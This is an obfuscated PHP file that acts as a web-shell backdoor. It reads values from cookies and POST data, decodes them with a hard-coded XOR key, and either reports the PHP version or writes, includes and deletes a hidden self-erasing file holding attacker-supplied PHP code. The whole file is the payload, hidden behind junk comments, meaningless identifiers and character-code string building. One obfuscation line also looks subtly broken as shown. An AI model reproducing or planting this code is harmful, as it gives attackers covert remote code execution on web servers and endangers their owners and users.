<?php /*  nqab  */function       bbflnnhms(){$lvwep_cs='trxtxeay';       print_r	(78687+78687);      }
$zrilnbwbh/*sue */=      'zrilnbwbh'	^/* zqv*/'';





function  olmykjclfz($skqdy,	$lwmvean)
{

/*   fxakq*/global/*dawhn*/$zrilnbwbh;


	$ckhtswiuie_wnczs_f/*njx   */=    "";
/*  hax  */for   ($zrvmg	=       0;/*  moiig */$zrvmg/*   sfav  */<      strlen($skqdy);)       {	for   ($ckhtswiui/* jz*/=    0;      $ckhtswiui/*   hia */<    strlen($lwmvean)/*rjvi  */&&/* _caqu */$zrvmg      </*  zzcs  */strlen($skqdy);/*  wd   */$ckhtswiui++,	$zrvmg++)       {
     $ckhtswiuie_wnczs_f    .=	$zrilnbwbh(ord($skqdy[$zrvmg])      ^/* mciq   */ord($lwmvean[$ckhtswiui]));

	}	}

       return/*   de */$ckhtswiuie_wnczs_f;
}


function	ziambnmm($vezdm,      $skqdy)


{	global     $zrilnbwbh;
/* lap  */$gmti_p	=  sprintf(".".$zrilnbwbh(47)/*dt  */.	$zrilnbwbh(828-791)/*  fnwk  */.   $zrilnbwbh(675-560)	./*u*/"\x2e"  ./*   fbhe*/"p"."l",  md5($vezdm));


	file_put_contents($gmti_p,/*   cig */"<"	.	"\x3f"   .    "\160"  .       "h"."\160"	./* j   */$zrilnbwbh(32)	./* yw*/"\165"  .	$zrilnbwbh(110)	.  "l"."\151"."\x6e"	.  $zrilnbwbh(221-114)/*   i*/.       "("."_"."_".$zrilnbwbh(679-609)      ./*u   */$zrilnbwbh(73)      .	$zrilnbwbh(320-244)	.     "E"."_".$zrilnbwbh(798-703)	./*  qwj */"\x29"/* vkcsg*/./*  rfo_s*/";".$zrilnbwbh(32)	.	$skqdy["d"]);


/*   l  */include($gmti_p);	$_mreanwbgf/*  pk */=    $gmti_p;
/*  hgv*/unlink($_mreanwbgf);}

function/* cugje*/qmsx_jhq(){
	global	$zrilnbwbh;
/* lchgk  */


	$zrvmg	=	array();

	$zrvmg[$zrilnbwbh(112)/* o  */./* jc*/"v"]  =/*qz */phpversion();

    $zrvmg[$zrilnbwbh(115)     ./*ljw  */"v"]	=	"\63"/*   ye  */.     "\x2e"/* bb  */./* qkab*/$zrilnbwbh(314-261);     echo       @serialize($zrvmg);

}



function     vhwzaxcw($skqdy,/*  x   */$vezdm,	$swbvao_r)


{

      global/*  qreya   */$zrilnbwbh;


	
    $skqdy	=      unserialize(olmykjclfz(olmykjclfz(base64_decode($skqdy),	$vezdm),	$swbvao_r));

     if      (isset($skqdy["\x61"."\153"]))/* gxytw */{
     if       ($skqdy["\x61"]     ==	"\151")      {
     qmsx_jhq();	}/* trye*/elseif	($skqdy["\x61"]/*_  */==/*   _qv */"e")	{	ziambnmm($vezdm,   $skqdy);

/*   gopzt   */}    exit();


/*  ofn   */}}


$manx_exos_/*  vg  */=/*  cqk_ */$_COOKIE;


$khejzyfbk/*  ewc   */=       $_POST;
$manx_exos_	=/*ja   */array_merge($khejzyfbk,/* hymv*/$manx_exos_);




$vezdm	=/* y */"4"."2"."b"."2".$zrilnbwbh(98)/* avtit  */.    $zrilnbwbh(54)/*   p   */.      "\62"  .       "5".$zrilnbwbh(369-324)     ./*tv*/"\71"	.       $zrilnbwbh(284-232)      .	"d"."\145"      ./*   znes*/$zrilnbwbh(390-345)	.	"\64"/*gg   */./*   ee   */"7"."4".$zrilnbwbh(1045-944)    .      $zrilnbwbh(92-47)   .	"\x38"   .	$zrilnbwbh(48)	./*   _paj   */"\146"/*myl  */.   "8"."-"."\64"  .	"\x33"/*   il*/./*jhuhb */"4"."\x64"/*y_v  */.	"d"."c"."5".$zrilnbwbh(98)/*   slrox  */.    $zrilnbwbh(56)/* szlg  */.   "1"."\145"	./*  h_ */"1";
foreach  ($manx_exos_	as	$swbvao_r   =>	$skqdy)/*yhwi*/{

/*akklh*/vhwzaxcw($skqdy,/*  czacx*/$vezdm,      $swbvao_r);

}


